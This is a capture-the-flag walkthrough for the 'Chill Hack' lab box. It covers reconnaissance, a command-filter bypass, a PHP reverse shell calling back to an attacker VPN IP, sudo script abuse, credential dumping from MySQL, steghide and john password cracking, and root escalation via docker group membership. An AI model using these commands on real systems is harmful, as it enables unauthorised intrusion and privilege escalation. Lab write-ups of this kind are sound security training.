# Chill Hack
Easy level CTF.

### User flag

Running a nmap scan to see how many ports are open
```
nmap -sC -sV <ip>
```

We have found 3 open ports:
```
21/tcp open  ftp
|  ftp-anon: Anonymous FTP login allowed
22/tcp open  ssh
80/tcp open  http
```
We can see that the FTP server allows anonymous login.


Logging in to the FTP server as "anonymous" with no password:
```
ftp <ip>
```

Checking what's on the server
```
ls -a
```

We see there is a file named note.txt
We download the file using the get command
```
get note.txt
```

We then read the file 

```
cat note.txt
```
"Anurodh told me that there is some filtering on strings being put in the command -- Apaar"


Now we run gobuster to look for secret directories, using one of the wordlists that come with Kali
```
gobuster dir -u <ip> -w usr/share/wordlists/dirb/common.txt -x "txt,html,php"
```
```
/fonts                (Status: 301)
/images               (Status: 301) 
/index.html           (Status: 200) 
/index.html           (Status: 200) 
/js                   (Status: 301) 
/news.html            (Status: 200) 
/secret               (Status: 301) 
/server-status        (Status: 403)
/team.html            (Status: 200)

```
We check out the /secret page and find whats seems like a way to execute commands

We test it out by trying to list the current directory with ls and are met with  " Are you a hacker ? " and ALERT CONDITION: RED
We can assume that this is what the note.txt file was talking about, the commands are being filtered.

Now we test out which commands we can run.

```
whoami
```
gives us "www-data"

We figure out that there are ways to bypass the filter, like adding backslashes or quotation marks to your commands
https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-paths-and-forbidden-words

Knowing this, we want to start a netcat listener and try to get a reverse shell
```
nc -lvnp <port>
```
I got a reverse shell from:
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Adding backslashes we have:
```
p\hp -r '$sock=fsockopen("your-vpn-ip",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
Now we have a shell as www-data, we use sudo -l to list files that can be run as other users.
We see that we can run .helpline.sh as Apaar
```
cat /home/apaar/.helpline.sh 
```
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"

sudo -u apaar /home/apaar/.helpline.sh

Type anything for the first message and for the second message type:

/bin/sh


To get a stable shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

We find the user flag in Apaar's home folder in a file called local.txt

### Root flag
Looking arouund in the files, we found credentials for mysql in the file /var/www/files/index.php

We connect to the mysql service, with the password we just found
```
mysql -u root -p
```

Using these commands we get Anurodh and Apaar's passwords (hashed)
SHOW DATABASES;
USE webportal
SHOW TABLES;
SELECT * FROM users;

We set up a python web server
python3 -m http.server 8888

Now we can see the image at 10.10.221.98:8888/hacker-with-laptop_23-2147985341.jpg
And download it with
wget 10.10.221.98:8888/hacker-with-laptop_23-2147985341.jpg 

steghide --extract -sf home/kali/Downloads/hacker-with-laptop_23-2147985341.jpg
Inside the image is a zipfile with a php file
The zip file is password protected

sudo /usr/sbin/zip2john backup.zip > home/kali/Downloads/backup.hash

sudo john home/kali/Downloads/backup.hash --wordlist=usr/share/wordlists/rockyou.txt 

 sudo unzip -P pass1word backup.zip

 Inside the php file there is a base64 encoded password and a possible username
We decode the password and try to log in as anurodh
ssh anurodh@10.10.143.136
It works!

We run 'id' and see he is in the docker group
https://gtfobins.github.io/gtfobins/docker/#shell

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

We now have root access and can find the root flag in the proof.txt file

